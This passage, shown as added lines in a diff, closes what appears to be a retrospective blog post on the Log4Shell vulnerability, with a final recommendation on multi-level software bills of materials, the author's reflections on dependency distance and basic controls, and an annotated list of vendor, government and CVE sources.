+8. **Ask for bills of materials that go below the top level.** Apache ships its own; ask your suppliers for theirs, and ask how many levels of dependencies they cover.
+
+## What I take from it
+
+The fix for the original flaw was available within sixteen days of the report, from a volunteer project, while another party disclosed it first. By the standards of the industry that is a good response, and the CSRB said as much. The patch chain that followed was messy, and that was also normal: the first fix of a new class of flaw is rarely the last, and the mitigations written in the first hours are the ones most likely to be withdrawn.
+
+What made Log4Shell endemic was not the code. It was the distance between the code and the people who depended on it: five levels of dependencies, a box that only its vendor could open, a log collector nobody counted as exposed. Almost five years on, that distance is shorter in places, thanks to bills of materials, some funding and a project that now states in writing that it does not trust log messages. It has not closed. The controls that closed the most doors in December 2021 were the old ones, the same ones thirty years of networking keep teaching me: know what you run, keep servers from calling out, and treat anything a stranger can write, including a log line, as input.
+
+## Sources
+
+All read on 2 November 2026, between 12:22 and 12:54 São Paulo time. Apache's Lookups manual and security page were read again at 14:01 for the lookup syntax.
+
+- [Apache Logging Services, Security: the common threat model ("Log4cxx, Log4j, and Log4net do not trust log messages"; an in-scope adversary may submit input resembling lookup syntax); the entries for CVE-2021-44228 (summary: "JNDI lookup can be exploited to execute arbitrary code loaded from an LDAP server"; affected from 2.0-beta9), CVE-2021-45046, CVE-2021-45105 and CVE-2021-44832 with ratings, affected and fixed versions, credits (Chen Zhaojun of Alibaba Cloud Security Team for CVE-2021-44228); the Log4j 1 mitigation and end-of-life statement; the CycloneDX SBOM and VDR; the Log4j bug bounty on YesWeHack funded by the Sovereign Tech Agency](https://logging.apache.org/security.html)
+- [Apache Log4j, Release notes: 2.0 (12 July 2014, first GA release); 2.15.0, 2.16.0, 2.17.0 and 2.17.1 with their dates and changes, the 2.15.0 interim mitigations, and the statement that before 2.15.0 lookups in the message or its parameters were resolved automatically; 2.22.0 (17 November 2023, SBOM with each artifact); 2.26.1 (29 June 2026) and 2.25.5 (1 July 2026)](https://logging.apache.org/log4j/2.x/release-notes.html)
+- [Apache Log4j, Download: the latest release, the reproducible-builds check, and the maintenance status table (2.12.x and 2.3.x end of maintenance on 29 December 2021, last releases for Java 7 and Java 6; 1.x first released 8 January 2000, end of life 5 August 2015)](https://logging.apache.org/log4j/2.x/download.html)
+- [Apache Log4j, Versioning and maintenance policy: only the latest minor release of the latest major version in active maintenance "due to the limited resources of the Log4j project"; security fixes for end-of-maintenance versions "very unlikely"](https://logging.apache.org/log4j/2.x/versioning.html)
+- [Apache Log4j manual, Lookups: the property substitution system and its `${prefix:key}` syntax; the JNDI lookup's syntax, `jndi:<name>`, which must be enabled explicitly through log4j2.enableJndiLookup since 2.17.0 and supports only the java: protocol](https://logging.apache.org/log4j/2.x/manual/lookups.html)
+- [Apache log4j 1.2: end of life announced on 5 August 2015; the Log4j 1 vulnerabilities that will not be fixed](https://logging.apache.org/log4j/1.x/index.html)
+- [Apache Logging Services, Support: the ASF does not employ individuals to develop and support its projects](https://logging.apache.org/support.html)
+- [Apache Log4j security page as published in the project's repository at the rel/2.17.1 tag: the history of CVE-2021-45046 (3.7 to 9.0) and the "Older (discredited) mitigation measures"](https://github.com/apache/logging-log4j2/blob/rel/2.17.1/src/site/markdown/security.md)
+- [Apache issue tracker: LOG4J2-313 "JNDI Lookup plugin support" (17 July 2013, 2.0-beta9); LOG4J2-3198 (29 November 2021); LOG4J2-3201 (5 December 2021); LOG4J2-3293 (28 December 2021)](https://issues.apache.org/jira/browse/LOG4J2-3198)
+- [Apache Log4j repository, pull requests 607 and 608: "LOG4J2-3198: Log4j2 no longer formats lookups in messages by default" (commit of 29 November 2021) and the LDAP restriction commits from 30 November 2021](https://github.com/apache/logging-log4j2/pull/608)
+- [CVE record CVE-2021-44228: reserved 26 November 2021, published 10 December 2021 by Apache; CISA's enrichment with CVSS 3.1 10.0, SSVC exploitation active, automatable, total impact, and KEV date 10 December 2021](https://www.cve.org/CVERecord?id=CVE-2021-44228)
+- [CVE record CVE-2021-45046: published 14 December 2021; Apache's section still rates it "moderate (CVSS: 3.7...)", CISA's enrichment gives 9.0 and KEV date 1 May 2023](https://www.cve.org/CVERecord?id=CVE-2021-45046)
+- [CVE record CVE-2021-45105: published 18 December 2021, fixed in 2.17.0, 2.12.3 and 2.3.1](https://www.cve.org/CVERecord?id=CVE-2021-45105)
+- [CVE record CVE-2021-44832: published 28 December 2021, fixed in 2.17.1, 2.12.4 and 2.3.2](https://www.cve.org/CVERecord?id=CVE-2021-44832)
+- [CVE record CVE-2021-4104: JMSAppender in Log4j 1.2, published 14 December 2021](https://www.cve.org/CVERecord?id=CVE-2021-4104)
+- [CVE records CVE-2022-23302, CVE-2022-23305 and CVE-2022-23307 (Log4j 1.x, published 18 January 2022) and CVE-2019-17571 (Log4j 1.2 SocketServer)](https://www.cve.org/CVERecord?id=CVE-2022-23305)
+- [NVD, CVE-2021-45046: CVSS 3.1 9.0 from NVD and CISA](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)
+- [Maven Central, log4j-core directory listing: the dates on which 2.12.2, 2.12.3, 2.12.4, 2.3.1 and 2.3.2 were published](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/)
+- [Cyber Safety Review Board, "Review of the December 2021 Log4j Event", 11 July 2022: the discovery and disclosure timeline, the earliest known exploitation, the PRC and MIIT passage, the 33,000 hours, "endemic vulnerability", and the 19 recommendations](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf)
+- [CISA, ED 22-02: Mitigate Apache Log4j Vulnerability (Closed): the directive of 17 December 2021, its required actions and deadlines, the FAQ on Log4j 1.x, and the closure notice of 8 April 2022](https://www.cisa.gov/news-events/directives/ed-22-02-mitigate-apache-log4j-vulnerability-closed)
+- [CISA, Apache Log4j Vulnerability Guidance: operational technology products; the update of 28 December 2021 urging 2.17.1, 2.12.4 and 2.3.2; the update of 8 April 2022 on file-system scanning and patching over mitigation](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
+- [CISA, Statement from CISA Director Easterly on "Log4j" Vulnerability, 11 December 2021](https://www.cisa.gov/news-events/news/statement-cisa-director-easterly-log4j-vulnerability)
+- [CISA and partners, AA21-356A, "Mitigating Log4Shell and Other Log4j-Related Vulnerabilities", 22 December 2021: the eight agencies, exploitation from about 1 December, the inventory, isolation and egress recommendations](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
+- [CISA, Log4j affected software repository on GitHub: the README with ED 22-02's mitigation list, the consolidated data file (counted for this post), and the archive notice of 2 February 2023](https://github.com/cisagov/log4j-affected-db)
+- [CISA, Known Exploited Vulnerabilities catalogue (JSON feed): CVE-2021-44228 added 10 December 2021, due 24 December; CVE-2021-45046 added 1 May 2023; both with known ransomware campaign use](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
+- [CISA and US Coast Guard Cyber Command, AA22-174A, "Malicious Cyber Actors Continue to Exploit Log4Shell in VMware Horizon Systems", 23 June 2022](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-174a)
+- [CISA and FBI, AA22-320A, "Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester", 16 November 2022](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a)
+- [CISA and partners, AA22-117A, "2021 Top Routinely Exploited Vulnerabilities"](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-117a)
+- [CISA and partners, AA23-215A, "2022 Top Routinely Exploited Vulnerabilities", 3 August 2023](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-215a)
+- [CISA and partners, AA24-317A, "2023 Top Routinely Exploited Vulnerabilities", 12 November 2024](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-317a)
+- [NCSC-UK, "Alert: Apache Log4j vulnerabilities", published 10 December 2021 and updated to 13 January 2022](https://www.ncsc.gov.uk/news/apache-log4j-vulnerability)
+- [BSI, "Warnstufe Rot: Schwachstelle Log4Shell führt zu extrem kritischer Bedrohungslage", 11 December 2021, updated 16 December 2021](https://www.bsi.bund.de/DE/Service-Navi/Presse/Pressemitteilungen/Presse2021/211211_log4Shell_WarnstufeRot.html)
+- [CERT-EU, Security Advisory 2021-067, "Java Logging Package RCE Vulnerability", versions 1.0 (10 December 2021) to 1.10 (29 January 2022)](https://cert.europa.eu/publications/security-advisories/2021-067/)
+- [ENISA, "Joint Statement on Log4Shell", 15 December 2021](https://www.enisa.europa.eu/news/enisa-news/statement-on-log4shell)
+- [NCSC-NL, Log4shell repository: why it kept a list of vulnerable software instead of updating its advisory](https://github.com/NCSC-NL/log4shell)
+- [F5, K19026212: Apache Log4j2 Remote Code Execution vulnerability CVE-2021-44228, published 9 December 2021, updated 22 January 2024](https://my.f5.com/manage/s/article/K19026212)
+- [Fortinet PSIRT, FG-IR-21-245, published 12 December 2021](https://www.fortiguard.com/psirt/FG-IR-21-245)
+- [Google Online Security Blog, "Understanding the Impact of Apache Log4j Vulnerability", 17 December 2021, by the Open Source Insights team: the Maven Central counts, the editor's note and the dependency depths](https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html)
+- [Executive Order 14028, "Improving the Nation's Cybersecurity", 12 May 2021, section 4(e)(vii) and the definition of SBOM in section 10(j)](https://www.govinfo.gov/content/pkg/FR-2021-05-17/html/2021-10460.htm)
+- [Regulation (EU) 2024/2847, the Cyber Resilience Act: article 3(39), annex I part II(1) and article 71](https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=OJ:L_202402847)
+- [Apache Software Foundation, statement on the White House Open Source Security Summit, 14 January 2022](https://blogsarchive.apache.org/foundation/entry/apache-software-foundation-statement-on)
+- [OpenSSF, "OpenSSF Announces the Alpha-Omega Project", 1 February 2022](https://openssf.org/press-release/2022/02/01/openssf-announces-the-alpha-omega-project-to-improve-software-supply-chain-security-for-10000-oss-projects/)
+- [Linux Foundation and OpenSSF, Open Source Software Security Summit II and the mobilisation plan, 12 May 2022](https://openssf.org/press-release/2022/05/12/the-linux-foundation-and-open-source-software-security-foundation-openssf-gather-industry-and-government-leaders-for-open-source-software-security-summit-ii/)
+- [Sovereign Tech Agency, Log4j: €596,160 invested in 2023 and 2024, and the maintainers' funding before it](https://www.sovereign.tech/tech/log4j)
